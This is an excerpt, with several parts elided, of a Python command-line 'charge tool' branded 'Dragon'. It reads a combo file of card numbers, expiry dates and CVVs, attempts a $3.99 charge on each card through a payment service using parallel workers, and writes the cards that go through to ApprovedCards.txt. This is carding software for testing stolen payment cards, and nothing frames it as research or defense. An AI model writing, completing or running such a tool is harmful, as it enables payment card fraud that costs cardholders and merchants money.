...
def display_banner():
    banner_text = Text("DRAGON 3.99$ CHARGE TOOL", style="bold cyan", justify="center")
...
def check_card(card_details):
    try:
        ...
        if any(keyword in response_data.get('message', '').lower() for keyword in decline_keywords):
            console.print(f" @Dragon > ➦ {cn}|{expm}|{expy}|{cv} [bold red]Declined ⛔[/bold red] - {response_data.get('message')}")
        else:
            console.print(f" @Dragon > ➦ {cn}|{expm}|{expy}|{cv} [bold green]Charged 3.99$ ✅[/bold green] - {response_data.get('message')}")
            with open("ApprovedCards.txt", "a") as file:
                file.write(f"{cn}|{expm}|{expy}|{cv}\n")
    except json.JSONDecodeError:
        console.print(f" @Dragon > ➦ {cn}|{expm}|{expy}|{cv} - [bold yellow]Failed to decode JSON response[/bold yellow]")
    except Exception as e:
        console.print(f" @Dragon > ⚠️ [bold red]Error processing card {cn}|{expm}|{expy}|{cv}[/bold red] - {str(e)}")

def main():
    clear_terminal()
    display_banner()
    combo_file = Prompt.ask(" @Dragon > ^ [bold cyan]Name Combo[/bold cyan]  : ")
    clear_terminal()
    display_banner()
    try:
        ...
        console.print(" @Dragon > ⚠️ [bold yellow]Unable to decode the file using UTF-8. Trying a different encoding...[/bold yellow]")
        with open(combo_file, "r", encoding="ISO-8859-1") as file:
            cards = file.readlines()
    except FileNotFoundError:
        console.print(f" @Dragon > ❌ [bold red]File {combo_file} not found.[/bold red]")
        return
    except Exception as e:
        console.print(f" @Dragon > ⚠️ [bold red]Unexpected error opening file:[/bold red] {str(e)}")
        return
    max_workers = 5
...
if __name__ == "__main__":
    main()
    console.print("\n @Dragon > ✅ [bold green]Process completed.[/bold green] Press Enter to exit...")
    input()
